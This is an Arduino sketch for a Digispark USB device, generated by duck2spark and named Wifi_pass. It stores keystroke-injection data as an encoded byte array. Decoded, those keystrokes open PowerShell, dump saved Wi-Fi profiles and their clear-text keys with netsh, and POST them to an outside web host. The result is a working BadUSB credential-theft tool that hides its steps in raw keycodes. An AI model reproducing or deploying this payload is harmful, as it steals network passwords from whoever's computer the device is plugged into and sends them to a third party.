#include <Arduino.h>
#line 1 "C:\\Users\\NHTHEBEST\\Documents\\Arduino\\Wifi_pass\\Wifi_pass.ino"
#line 1 "C:\\Users\\NHTHEBEST\\Documents\\Arduino\\Wifi_pass\\Wifi_pass.ino"
/*#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
  pinMode(0,OUTPUT);
  DigiKeyboard.delay(500);
}


void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0);
  
  // Type out this string letter by letter on the computer (assumes US-style
  // keyboard)
  DigiKeyboard.println("Hello Digispark!");
  
  // It's better to use DigiKeyboard.delay() over the regular Arduino delay()
  // if doing keyboard stuff because it keeps talking to the computer to make
  // sure the computer knows the keyboard is alive and connected
  while(1)
  DigiKeyboard.delay(5000);
}*/

/*
* Sketch generated by duck2spark from Marcus Mengs aka MaMe82
*
*/
#include "DigiKeyboard.h"

#define DUCK_LEN 912
const PROGMEM uint8_t duckraw [DUCK_LEN] = {
  0x15, 0x8, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xeb, 0x13, 0x0, 0x12, 0x0, 0x1a, 0x0, 0x8, 0x0, 0x15, 0x0, 0x16, 0x0, 0xb, 0x0, 0x8, 0x0, 0xf, 0x0, 0xf, 0x0, 0x0, 0xff, 0x0, 0xf5, 0x28, 0x0, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xff, 0x0, 0xc3, 0x21, 0x2, 0xc, 0x0, 0x7, 0x0, 0x1e, 0x0, 0x2c, 0x0, 0x2e, 0x0, 0x2c, 0x0, 0x26, 0x2, 0x11, 0x0, 0x8, 0x0, 0x17, 0x0, 0x16, 0x0, 0xb, 0x0, 0x2c, 0x0, 0x1a, 0x0, 0xf, 0x0, 0x4, 0x0, 0x11, 0x0, 0x2c, 0x0, 0x16, 0x0, 0xb, 0x0, 0x12, 0x0, 0x1a, 0x0, 0x2c, 0x0, 0x13, 0x0, 0x15, 0x0, 0x12, 0x0, 0x9, 0x0, 0xc, 0x0, 0xf, 0x0, 0x8, 0x0, 0x16, 0x0, 0x2c, 0x0, 0x31, 0x2, 0x2c, 0x0, 0x16, 0x2, 0x8, 0x0, 0xf, 0x0, 0x8, 0x0, 0x6, 0x0, 0x17, 0x0, 0x2d, 0x0, 0x16, 0x2, 0x17, 0x0, 0x15, 0x0, 0xc, 0x0, 0x11, 0x0, 0xa, 0x0, 0x2c, 0x0, 0x34, 0x0, 0x33, 0x2, 0x2c, 0x0, 0x34, 0x0, 0x2c, 0x0, 0x27, 0x2, 0x2c, 0x0, 0x2d, 0x0, 0x15, 0x0, 0x8, 0x0, 0x13, 0x0, 0xf, 0x0, 0x4, 0x0, 0x6, 0x0, 0x8, 0x0, 0x2c, 0x0, 0x34, 0x2, 0x37, 0x0, 0x25, 0x2, 0x33, 0x2, 0x31, 0x0, 0x16, 0x0, 0x2e, 0x2, 0x34, 0x2, 0x2c, 0x0, 0x33, 0x0, 0x2c, 0x0, 0x21, 0x2, 0xc, 0x0, 0x7, 0x0, 0x1f, 0x0, 0x2c, 0x0, 0x2e, 0x0, 0x2c, 0x0, 0x9, 0x0, 0x12, 0x0, 0x15, 0x0, 0x8, 0x0, 0x4, 0x0, 0x6, 0x0, 0xb, 0x0, 0x26, 0x2, 0x21, 0x2, 0x16, 0x2, 0x16, 0x2, 0xc, 0x2, 0x7, 0x2, 0x2c, 0x0, 0xc, 0x0, 0x11, 0x0, 0x2c, 0x0, 0x21, 0x2, 0xc, 0x0, 0x7, 0x0, 0x1e, 0x0, 0x27, 0x2, 0x2c, 0x0, 0x2f, 0x2, 0x21, 0x2, 0x13, 0x0, 0x4, 0x0, 0x16, 0x0, 0x16, 0x0, 0x2c, 0x0, 0x2e, 0x0, 0x2c, 0x0, 0x26, 0x2, 0x11, 0x0, 0x8, 0x0, 0x17, 0x0, 0x16, 0x0, 0xb, 0x0, 0x2c, 0x0, 0x1a, 0x0, 0xf, 0x0, 0x4, 0x0, 0x11, 0x0, 0x2c, 0x0, 0x16, 0x0, 0xb, 0x0, 0x12, 0x0, 0x1a, 0x0, 0x2c, 0x0, 0x13, 0x0, 0x15, 0x0, 0x12, 0x0, 0x9, 0x0, 0xc, 0x0, 0xf, 0x0, 0x8, 0x0, 0x16, 0x0, 0x2c, 0x0, 0x11, 0x0, 0x4, 0x0, 0x10, 0x0, 0x8, 0x0, 0x2e, 0x0, 0x21, 0x2, 0x16, 0x2, 0x16, 0x2, 0xc, 0x2, 0x7, 0x2, 0x2c, 0x0, 0xe, 0x0, 0x8, 0x0, 0x1c, 0x0, 0x2e, 0x0, 0x6, 0x0, 0xf, 0x0, 0x8, 0x0, 0x4, 0x0, 0x15, 0x0, 0x2c, 0x0, 0x31, 0x2, 0x2c, 0x0, 0x16, 0x2, 0x8, 0x0, 0xf, 0x0, 0x8, 0x0, 0x6, 0x0, 0x17, 0x0, 0x2d, 0x0, 0x16, 0x2, 0x17, 0x0, 0x15, 0x0, 0xc, 0x0, 0x11, 0x0, 0xa, 0x0, 0x2c, 0x0, 0x34, 0x0, 0xe, 0x2, 0x8, 0x0, 0x1c, 0x0, 0x2c, 0x0, 0x6, 0x2, 0x12, 0x0, 0x11, 0x0, 0x17, 0x0, 0x8, 0x0, 0x11, 0x0, 0x17, 0x0, 0x34, 0x0, 0x27, 0x2, 0x2c, 0x0, 0x2d, 0x0, 0x15, 0x0, 0x8, 0x0, 0x13, 0x0, 0xf, 0x0, 0x4, 0x0, 0x6, 0x0, 0x8, 0x0, 0x2c, 0x0, 0x34, 0x2, 0x37, 0x0, 0x25, 0x2, 0x33, 0x2, 0x31, 0x0, 0x16, 0x0, 0x2e, 0x2, 0x34, 0x2, 0x2c, 0x0, 0x33, 0x0, 0x2c, 0x0, 0x11, 0x2, 0x8, 0x0, 0x1a, 0x0, 0x2d, 0x0, 0x12, 0x2, 0x5, 0x0, 0xd, 0x0, 0x8, 0x0, 0x6, 0x0, 0x17, 0x0, 0x2c, 0x0, 0x2d, 0x0, 0x17, 0x2, 0x1c, 0x0, 0x13, 0x0, 0x8, 0x0, 0x11, 0x2, 0x4, 0x0, 0x10, 0x0, 0x8, 0x0, 0x2c, 0x0, 0x13, 0x0, 0x16, 0x0, 0x12, 0x0, 0x5, 0x0, 0xd, 0x0, 0x8, 0x0, 0x6, 0x0, 0x17, 0x0, 0x2c, 0x0, 0x2d, 0x0, 0x13, 0x2, 0x15, 0x0, 0x12, 0x0, 0x13, 0x0, 0x8, 0x0, 0x15, 0x0, 0x17, 0x0, 0x1c, 0x0, 0x2c, 0x0, 0x1f, 0x2, 0x2f, 0x2, 0x34, 0x2, 0x16, 0x2, 0x16, 0x2, 0xc, 0x2, 0x7, 0x2, 0x34, 0x2, 0x2e, 0x0, 0x21, 0x2, 0x16, 0x2, 0x16, 0x2, 0xc, 0x2, 0x7, 0x2, 0x33, 0x0, 0x34, 0x2, 0x13, 0x0, 0x4, 0x0, 0x16, 0x0, 0x16, 0x0, 0x34, 0x2, 0x2e, 0x0, 0x21, 0x2, 0x13, 0x0, 0x4, 0x0, 0x16, 0x0, 0x16, 0x0, 0x30, 0x2, 0x30, 0x2, 0x2c, 0x0, 0x2c, 0x0, 0x33, 0x0, 0x2c, 0x0, 0x21, 0x2, 0xc, 0x0, 0x7, 0x0, 0x21, 0x0, 0x2c, 0x0, 0x2e, 0x0, 0x2c, 0x0, 0x21, 0x2, 0xc, 0x0, 0x7, 0x0, 0x1f, 0x0, 0x2c, 0x0, 0x31, 0x2, 0x2c, 0x0, 0x6, 0x2, 0x12, 0x0, 0x11, 0x0, 0x19, 0x0, 0x8, 0x0, 0x15, 0x0, 0x17, 0x0, 0x17, 0x2, 0x12, 0x0, 0x2d, 0x0, 0xd, 0x2, 0x16, 0x0, 0x12, 0x0, 0x11, 0x0, 0x2c, 0x0, 0x33, 0x0, 0x2c, 0x0, 0xc, 0x2, 0x11, 0x0, 0x19, 0x0, 0x12, 0x0, 0xe, 0x0, 0x8, 0x0, 0x2d, 0x0, 0x1a, 0x2, 0x8, 0x0, 0x5, 0x0, 0x15, 0x2, 0x8, 0x0, 0x14, 0x0, 0x18, 0x0, 0x8, 0x0, 0x16, 0x0, 0x17, 0x0, 0x2c, 0x0, 0x2d, 0x0, 0x18, 0x2, 0x15, 0x0, 0xc, 0x0, 0x2c, 0x0, 0xb, 0x0, 0x17, 0x0, 0x17, 0x0, 0x13, 0x0, 0x33, 0x2, 0x38, 0x0, 0x38, 0x0, 0x4, 0x0, 0x13, 0x0, 0xc, 0x0, 0x37, 0x0, 0x11, 0x0, 0xb, 0x0, 0x17, 0x0, 0xb, 0x0, 0x8, 0x0, 0x5, 0x0, 0x8, 0x0, 0x16, 0x0, 0x17, 0x0, 0x37, 0x0, 0x10, 0x0, 0x8, 0x0, 0x38, 0x0, 0x2c, 0x0, 0x2d, 0x0, 0x6, 0x2, 0x12, 0x0, 0x11, 0x0, 0x17, 0x0, 0x8, 0x0, 0x11, 0x0, 0x17, 0x0, 0x17, 0x2, 0x1c, 0x0, 0x13, 0x0, 0x8, 0x0, 0x2c, 0x0, 0x34, 0x2, 0x4, 0x0, 0x13, 0x0, 0x13, 0x0, 0xf, 0x0, 0xc, 0x0, 0x6, 0x0, 0x4, 0x0, 0x17, 0x0, 0xc, 0x0, 0x12, 0x0, 0x11, 0x0, 0x38, 0x0, 0xd, 0x0, 0x16, 0x0, 0x12, 0x0, 0x11, 0x0, 0x34, 0x2, 0x2c, 0x0, 0x2d, 0x0, 0x10, 0x2, 0x8, 0x0, 0x17, 0x0, 0xb, 0x0, 0x12, 0x0, 0x7, 0x0, 0x2c, 0x0, 0x13, 0x2, 0x12, 0x2, 0x16, 0x2, 0x17, 0x2, 0x2c, 0x0, 0x2d, 0x0, 0x5, 0x2, 0x12, 0x0, 0x7, 0x0, 0x1c, 0x0, 0x2c, 0x0, 0x21, 0x2, 0xc, 0x0, 0x7, 0x0, 0x21, 0x0, 0x33, 0x0, 0x8, 0x0, 0x1b, 0x0, 0xc, 0x0, 0x17, 0x0, 0x28, 0x0
};
int i = 1; //how many times the payload should run (-1 for endless loop)
bool blink=true;

#line 39 "C:\\Users\\NHTHEBEST\\Documents\\Arduino\\Wifi_pass\\Wifi_pass.ino"
void setup();
#line 47 "C:\\Users\\NHTHEBEST\\Documents\\Arduino\\Wifi_pass\\Wifi_pass.ino"
void loop();
#line 39 "C:\\Users\\NHTHEBEST\\Documents\\Arduino\\Wifi_pass\\Wifi_pass.ino"
void setup()
{
  // initialize the digital pin as an output.
  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A
  DigiKeyboard.delay(2000); //wait 2000 milliseconds before first run, to give target time to initialize
}

void loop()
{

  //should code be runned in this loop?
  if (i != 0) {
    DigiKeyboard.sendKeyStroke(0);

    //parse raw duckencoder script
    for (int i=0; i<DUCK_LEN; i+=2)
    {
      uint8_t key = pgm_read_word_near(duckraw + i);
      uint8_t mod = pgm_read_word_near(duckraw + i+1);
      if (key == 0) //delay (a delay>255 is split into a sequence of delays)
      {
        DigiKeyboard.delay(mod);
      }
      else DigiKeyboard.sendKeyStroke(key,mod);
    }
    i--;
    DigiKeyboard.delay(5000); //wait 5000 milliseconds before next loop iteration

  }
  else if (blink)
  {
    digitalWrite(0, HIGH);   // turn the LED on (HIGH is the voltage level)
    digitalWrite(1, HIGH);
    delay(100);               // wait for a second
    digitalWrite(0, LOW);    // turn the LED off by making the voltage LOW
    digitalWrite(1, LOW);
    delay(100);               // wait for a second
  }
}

